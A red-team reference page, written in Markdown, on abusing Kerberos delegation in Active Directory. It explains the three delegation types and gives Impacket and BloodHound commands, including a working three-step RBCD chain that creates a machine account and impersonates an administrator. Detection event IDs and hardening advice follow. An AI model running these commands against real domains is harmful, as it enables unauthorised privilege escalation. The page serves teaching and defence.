---
title: "Kerberos Delegation abuse"
category: "red-team"
tags: ["active-directory", "kerberos", "delegation", "privesc"]
platform: "windows"
mitre: ["T1558", "T1134.001"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Kerberos Delegation abuse

## TL;DR
Delegation lets a service act on behalf of a user against another service. Misconfigured delegation is a top AD privesc path. Three types: unconstrained (worst), constrained, and resource-based constrained (RBCD).

## Types & abuse
```text
Unconstrained (KUD)  – service can impersonate a user to ANY service.
  Abuse: compromise the host -> coerce a DC/admin to authenticate -> capture their TGT.
Constrained (KCD)    – service can impersonate to SPECIFIC services (msDS-AllowedToDelegateTo).
  Abuse: S4U2Self+S4U2Proxy to get a ticket to the allowed service as any user (incl. admin).
RBCD                 – target says WHO may delegate to it (msDS-AllowedToActOnBehalfOfOtherIdentity).
  Abuse: if you can write that attribute on a target, add a controlled account -> impersonate.
```

## Enumeration
```bash
# Find delegation (BloodHound shows edges; or via LDAP)
bloodhound-python -u user -p 'Pass' -d corp.local -c All
# Find unconstrained / constrained
impacket-findDelegation corp.local/user:'Pass' -dc-ip 10.10.10.10
```

## RBCD example (write access on a computer object)
```bash
# 1. Create a controlled computer account (default MachineAccountQuota=10)
impacket-addcomputer corp.local/user:'Pass' -computer-name EVIL$ -computer-pass 'P@ss'
# 2. Set RBCD on the target to trust EVIL$
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.local/user:'Pass'
# 3. S4U -> impersonate admin to the target service
impacket-getST -spn cifs/target.corp.local -impersonate administrator \
  corp.local/EVIL\$:'P@ss'
```

## Detection (Blue Team)
- S4U2Self/S4U2Proxy patterns (Event 4769 with transited services), TGT requests from delegated hosts.
- Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` / `msDS-AllowedToDelegateTo` (4662/5136).
- New computer accounts (4741) from non-admin users (MachineAccountQuota abuse).

## Mitigation / Hardening
- Eliminate **unconstrained delegation**; mark sensitive accounts "Account is sensitive and cannot be delegated" (or Protected Users).
- Set `MachineAccountQuota = 0`; restrict who can write delegation attributes.
- Audit delegation regularly (BloodHound), enforce tiering.

## Sources
- [The Hacker Recipes – Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations) · [MITRE T1558](https://attack.mitre.org/techniques/T1558/)
